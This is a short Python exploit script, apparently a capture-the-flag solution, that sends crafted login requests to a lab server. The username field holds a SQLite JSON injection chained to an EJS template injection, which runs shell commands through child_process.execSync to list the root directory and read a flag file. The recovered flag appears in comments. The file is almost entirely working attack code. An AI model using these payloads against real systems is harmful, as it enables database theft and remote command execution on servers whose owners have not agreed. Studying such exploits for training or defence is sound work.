import requests

if __name__ == "__main__":
    URL = "http://10.113.184.121:10081/login"
    # URL = "http://127.0.0.1:3000/login"
    data = {
        "username": f"\") AS password, json_extract(users, '$.admin.password') AS password FROM db 
        -- <%- global.process.mainModule.require('child_process').execSync('ls -al /') %> -- ",
        "password": "FLAG{sqlite_js0n_inject!on}"
    }
    response = requests.post(URL, data)
    
    data = {
        "username": f"\") AS password, json_extract(users, '$.admin.password') AS password FROM db 
        -- <%- global.process.mainModule.require('child_process').execSync('cat /flag2-1PRmDsTXoo3uPCdq.txt') %> -- ",
        "password": "FLAG{sqlite_js0n_inject!on}"
    }
    response = requests.post(URL, data)
    
    
    #flag2-1PRmDsTXoo3uPCdq.txt
    #FLAG{sqlite_js0n_inject!on}